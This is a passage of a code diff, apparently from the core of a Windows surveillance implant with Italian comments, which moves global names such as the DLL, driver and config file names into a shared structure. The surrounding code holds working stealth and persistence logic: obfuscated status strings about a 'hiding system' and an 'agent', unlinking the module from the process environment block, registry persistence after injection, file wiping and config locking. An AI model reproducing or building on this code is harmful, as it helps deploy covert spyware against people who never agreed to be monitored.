+	conf_memory = HM_ReadClearConf(shared.H4_CONF_FILE);
 	if (conf_memory) {
 		HM_ParseConfGlobals(conf_memory, &ParseBypassCallback);
 		HM_ParseConfGlobals(conf_memory, &ParseDriverHandling);
@@ -2719,7 +2663,7 @@ BOOL FindModulePath(char *path_buf, DWORD path_size)
 	// Se ha gia' le variabili settate le recupera da li'
 	// altrimenti (e' la prima volta che lo chiama, o siamo in un servizio che
 	// non ha la shared), la calcola al volo.
-	HM_CompletePath(H4DLLNAME, path_buf);
+	HM_CompletePath(shared.H4DLLNAME, path_buf);
 	if (strlen(path_buf) >= 3)
 		return TRUE;
 
@@ -2781,7 +2725,7 @@ void HM_ClearCommand()
 void LockConfFile()
 {
 	char conf_path[DLLNAMELEN];
-	HM_CompletePath(H4_CONF_FILE, conf_path);
+	HM_CompletePath(shared.H4_CONF_FILE, conf_path);
 	FNC(SetFileAttributesA)(conf_path, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_ARCHIVE);
 	conf_file_handle = FNC(CreateFileA)(conf_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 }
@@ -2791,7 +2735,7 @@ void UnlockConfFile()
 	DWORD i;
 	char conf_path[DLLNAMELEN];
 
-	HM_CompletePath(H4_CONF_FILE, conf_path);
+	HM_CompletePath(shared.H4_CONF_FILE, conf_path);
 
 	if (conf_file_handle)
 		CloseHandle(conf_file_handle);
@@ -2865,9 +2809,9 @@ void HM_CalcDateDelta(long long server_time, nanosec_time *delta)
 void DeletePending()
 {
 	char d_file_path[MAX_PATH];
-	HM_WipeFileA(HM_CompletePath(H4DRIVER_NAME_ALT, d_file_path));
-	HM_WipeFileA(HM_CompletePath(H4DRIVER_NAME, d_file_path));
-	HM_WipeFileA(HM_CompletePath(H4_UPDATE_FILE, d_file_path));
+	HM_WipeFileA(HM_CompletePath(shared.H4DRIVER_NAME_ALT, d_file_path));
+	HM_WipeFileA(HM_CompletePath(shared.H4DRIVER_NAME, d_file_path));
+	HM_WipeFileA(HM_CompletePath(shared.H4_UPDATE_FILE, d_file_path));
 }
 
 // Main del core
@@ -2890,14 +2834,14 @@ void __stdcall HM_sMain(void)
 	if (!CreateLogWindow())
 		FNC(ExitProcess)(0);
 
-	ScrambleString ssok("QM\r\n", is_demo_version); // "OK\r\n"
-	ScrambleString ss1("_ B0lgDUPC gEo7EPlPv1...........", is_demo_version); // "- Checking components..........."
-	ScrambleString ss2("_ xgvUR8vUPC 0UiUPC 1J1vlo......", is_demo_version); // "- Activating hiding system......"
-	ScrambleString ss3("L99Q9\r\n    3-ru5 [eP8IWl vE il7WEJ]\r\n", is_demo_version); // "ERROR\r\n    17240 [Unable to deploy]\r\n"
-	ScrambleString ss4("_ yPUvU8WUAUPC oEidWl1..........", is_demo_version); // "- Initializing modules.........."
-	ScrambleString ss5("L99Q9\r\n    rYp35 [K0l 1J1vlo U1 8Wtl8iJ oEPUvEtli]\r\n", is_demo_version); // "ERROR\r\n    29310 [The system is already monitored]\r\n"
-	ScrambleString ss6("_ 4v8tvUPC gEtl oEidWl..........", is_demo_version); // "- Starting core module.........."
-	ScrambleString ss7("\r\n xClPv zdWWJ E7lt8vUEP8W\r\n\r\n", is_demo_version); // "\r\n Agent fully operational\r\n\r\n"
+	ScrambleString ssok("QM\r\n", shared.is_demo_version); // "OK\r\n"
+	ScrambleString ss1("_ B0lgDUPC gEo7EPlPv1...........", shared.is_demo_version); // "- Checking components..........."
+	ScrambleString ss2("_ xgvUR8vUPC 0UiUPC 1J1vlo......", shared.is_demo_version); // "- Activating hiding system......"
+	ScrambleString ss3("L99Q9\r\n    3-ru5 [eP8IWl vE il7WEJ]\r\n", shared.is_demo_version); // "ERROR\r\n    17240 [Unable to deploy]\r\n"
+	ScrambleString ss4("_ yPUvU8WUAUPC oEidWl1..........", shared.is_demo_version); // "- Initializing modules.........."
+	ScrambleString ss5("L99Q9\r\n    rYp35 [K0l 1J1vlo U1 8Wtl8iJ oEPUvEtli]\r\n", shared.is_demo_version); // "ERROR\r\n    29310 [The system is already monitored]\r\n"
+	ScrambleString ss6("_ 4v8tvUPC gEtl oEidWl..........", shared.is_demo_version); // "- Starting core module.........."
+	ScrambleString ss7("\r\n xClPv zdWWJ E7lt8vUEP8W\r\n\r\n", shared.is_demo_version); // "\r\n Agent fully operational\r\n\r\n"
 
 	REPORT_STATUS_LOG(ss1.get_str());
 
@@ -2906,7 +2850,7 @@ void __stdcall HM_sMain(void)
 
 	// Elimina il modulo dalla PEB
 	// XXX da qui in poi non potro' piu' fare GetModuleHandle etc. di questo modulo
-	HidePEB(GetModuleHandle(H4DLLNAME));
+	HidePEB(GetModuleHandle(shared.H4DLLNAME));
 
 	REPORT_STATUS_LOG(ssok.get_str()); 
 
@@ -2930,7 +2874,7 @@ void __stdcall HM_sMain(void)
 	// o corrotto (lo rimpiazza con l'eventuale copia di backup).
 	// Va fatto prima di AM_Startup, perche' quest'ultima legge
 	// gia' il file di configurazione.
-	HM_CheckNewConf(H4_CONF_BU);
+	HM_CheckNewConf(shared.H4_CONF_BU);
 	//HM_CheckNewConf("nc-7-8dv.cfg");
 
 	// Legge le configurazioni globali. Va fatto DOPO HM_CheckNewConf.
@@ -2941,7 +2885,7 @@ void __stdcall HM_sMain(void)
 	REPORT_STATUS_LOG(ss4.get_str());
 	if (!AM_Startup()) {
 		REPORT_STATUS_LOG(ss5.get_str()); 
-		g_remove_driver = FALSE; // Disinstalla questa istanza ma lascia il driver per eventuali altre istanze running
+		shared.g_remove_driver = FALSE; // Disinstalla questa istanza ma lascia il driver per eventuali altre istanze running
 		DA_Uninstall(NULL); // AM_Startup fallisce se la sharedmemory gia' esiste
 	}
 	REPORT_STATUS_LOG(ssok.get_str()); 
@@ -2963,7 +2907,7 @@ void __stdcall HM_sMain(void)
 	// la chiave nel registry deve essere inserita ad ogni costo).
 	REPORT_STATUS_LOG(ss6.get_str());
 	Sleep(3300); // XXX Aspetta che venga fatta l'injection prima di scrivere la chiave
-	HM_InsertRegistryKey(H4DLLNAME, FALSE);
+	HM_InsertRegistryKey(shared.H4DLLNAME, FALSE);
 
 	// Cancella eventuali file pendenti vecchi e inutilizzati
 	DeletePending();
